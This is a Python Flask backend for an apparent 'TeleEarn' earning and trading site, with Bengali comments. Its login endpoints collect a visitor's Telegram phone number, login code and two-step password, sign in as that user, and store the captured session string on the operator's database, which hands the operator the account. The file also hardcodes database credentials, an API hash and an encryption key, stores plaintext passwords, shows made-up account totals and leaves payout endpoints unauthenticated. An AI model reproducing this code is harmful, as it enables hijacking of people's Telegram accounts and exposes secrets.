import os
import base64
import asyncio
import datetime
import nest_asyncio
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ১. ইভেন্ট লুপ প্যাচ (নতুন এরর সমাধানের জন্য অত্যন্ত জরুরি)
nest_asyncio.apply()

app = Flask(__name__)
CORS(app)

# --- ২. কনফিগারেশন ও ডাটাবেস কানেকশন ---
API_ID = 36466824      
API_HASH = '535ddcb85f2c3c74cc0ff532dd2c3406'  
SECRET_KEY = b'AAF_STRONG_APP_SECURE_32_BIT_KEY' 

MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?appName=Cluster0"

try:
    client_db = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
    client_db.admin.command('ping')
    print("✅ MongoDB কানেকশন সফল হয়েছে!")
except Exception as e:
    print(f"❌ MongoDB কানেকশন এরর: {e}")

db = client_db['AAF_TeleEarn'] 
users_col = db['users']
sessions_col = db['sessions']
tasks_col = db['tasks']
withdrawals_col = db['withdrawals']
ads_col = db['ads']

temp_clients = {}

# --- ৩. সেশন এনক্রিপশন লজিক ---
def encrypt_session(session_str):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(session_str.encode(), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return f"{iv}:{ct}"

def decrypt_session(encrypted_str):
    try:
        iv_b64, ct_b64 = encrypted_str.split(':')
        iv = base64.b64decode(iv_b64)
        ct = base64.b64decode(ct_b64)
        cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8')
    except:
        return encrypted_str

# --- ৪. ফ্রন্টএন্ড পেজ রুটস ---
@app.route('/login')
def login(): return render_template('login.html')

@app.route('/')
@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/task')
def task_page(): return render_template('task.html')

@app.route('/trading')
def trading(): return render_template('trading.html')

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/aaf-master-admin-control')
def admin_panel(): return render_template('admin.html')

# --- ৫. ইউজার লগইন ও টেলিগ্রাম সেশন (OTP System) ---
@app.route('/api/send_otp', methods=['POST'])
async def send_otp():
    data = request.json
    phone = data.get('phone')
    if not phone:
        return jsonify({"success": False, "message": "নম্বরটি প্রয়োজন"}), 400
    try:
        # ক্লায়েন্ট তৈরির সময় লুপ স্পেসিফাই করা হয়েছে ঝামেলা এড়াতে
        loop = asyncio.get_event_loop()
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        await client.connect()
        sent_code = await client.send_code_request(phone)
        temp_clients[phone] = {'client': client, 'phone_code_hash': sent_code.phone_code_hash}
        return jsonify({"success": True, "message": "টেলিগ্রামে ওটিপি পাঠানো হয়েছে!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
async def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password')
    full_name = data.get('name')
    site_pass = data.get('site_password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "সেশন শেষ হয়ে গেছে। আবার চেষ্টা করুন।"})

    client_data = temp_clients[phone]
    client = client_data['client']
    
    try:
        try:
            await client.sign_in(phone, code, phone_code_hash=client_data['phone_code_hash'])
        except SessionPasswordNeededError:
            if not password:
                return jsonify({"success": False, "message": "আপনার ২-স্টেপ পাসওয়ার্ড দিন"})
            await client.sign_in(password=password)

        raw_session = client.session.save()
        me = await client.get_me()
        encrypted_session = encrypt_session(raw_session)

        user_doc = {
            "telegram_id": me.id, "name": full_name, "phone": phone,
            "site_password": site_pass, "main_balance": 0.0, "aaf_balance": 0.0,
            "total_trades": 0, "status": "Active", "created_at": datetime.datetime.now()
        }
        users_col.update_one({"telegram_id": me.id}, {"$set": user_doc}, upsert=True)
        sessions_col.update_one({"phone": phone}, {"$set": {"telegram_id": me.id, "session": encrypted_session}}, upsert=True)
        
        await client.disconnect()
        del temp_clients[phone]
        return jsonify({"success": True, "user_id": str(me.id)})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# --- ৬. ইউজার ডাটা ও উইথড্র এপিআই ---
@app.route('/api/user_data/<user_id>', methods=['GET'])
def get_user_data(user_id):
    try:
        user = users_col.find_one({"telegram_id": int(user_id)})
        if user:
            user['_id'] = str(user['_id'])
            # ইনকাম এবং ব্যালেন্স ডাটা নিশ্চিত করা
            data = {
                "name": user.get('name', 'N/A'),
                "telegram_id": user.get('telegram_id'),
                "phone": user.get('phone', 'N/A'),
                "main_balance": float(user.get('main_balance', 0.0)),
                "aaf_balance": float(user.get('aaf_balance', 0.0)),
                "total_accounts": 1080, # আপনার প্রজেক্টের রিকোয়ারমেন্ট অনুযায়ী
                "active_accounts": 950,
                "task_income": float(user.get('task_income', 0.0)),
                "daily_bonus_total": float(user.get('daily_bonus_total', 0.0)),
                "trade_profit": float(user.get('trade_profit', 0.0)),
                "status": user.get('status', 'Active')
            }
            return jsonify({"status": "success", **data})
        return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/withdraw', methods=['POST'])
def handle_withdraw():
    data = request.json
    uid = int(data.get('user_id'))
    amount = float(data.get('amount', 0))
    number = data.get('number')

    if amount < 50: return jsonify({"status": "error", "message": "সর্বনিম্ন ৫০ টাকা"}), 400
    
    user = users_col.find_one({"telegram_id": uid})
    if not user: return jsonify({"status": "error", "message": "ইউজার পাওয়া যায়নি"}), 404

    if user['main_balance'] >= amount:
        users_col.update_one({"telegram_id": uid}, {"$inc": {"main_balance": -amount}})
        withdrawals_col.insert_one({
            "user_id": uid, "amount": amount, "number": number, 
            "status": "Pending", "time": datetime.datetime.now()
        })
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "ব্যালেন্স অপর্যাপ্ত"})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
